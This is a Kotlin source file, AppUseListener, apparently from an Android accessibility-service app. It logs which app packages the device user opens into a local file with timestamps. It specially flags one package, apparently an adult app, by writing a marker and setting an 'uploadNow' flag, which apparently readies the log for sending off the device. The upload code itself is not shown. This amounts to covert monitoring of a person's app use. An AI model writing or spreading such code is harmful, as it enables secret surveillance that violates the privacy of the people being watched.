package li.songe.gkd.a11y

import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import li.songe.gkd.a11y.utils.Folder
import li.songe.gkd.a11y.utils.appListenerFile
import li.songe.gkd.a11y.utils.appScope
import li.songe.gkd.a11y.utils.appUseFile
import li.songe.gkd.a11y.utils.appendTime
import li.songe.gkd.a11y.utils.launchTry
import li.songe.gkd.a11y.utils.uploadNow

object AppUseListener {
    private val appUse = HashMap<String, Int>()
    private var lastRead = System.currentTimeMillis()


    fun onAccessibilityEvent(
        event: AccessibilityEvent?,
        rootInActiveWindow: AccessibilityNodeInfo?
    ) {
        if ((System.currentTimeMillis() - lastRead) < 1000 * 5) return


        val app = event?.packageName.toString()
        if (app.startsWith("com.android")) {
            return
        }
        if (app.contains("com.zudbizaibimep")) {
            uploadNow = true
            appListenerFile.appendText("----好色先生----")
            appListenerFile.appendTime()
        }
        if (appUse.keys.contains(app)) {
            return
        }
        val use = appUse[app]?.plus(1) ?: 0
        appUse[app] = use

        uploadMessage()
        lastRead = System.currentTimeMillis()

    }

    private fun uploadMessage() {
        var liveMessage = ""
        appUse.map { liveMessage = "$it\n$liveMessage" }
        appUseFile.appendText(liveMessage)
        appUseFile.appendTime()
    }
}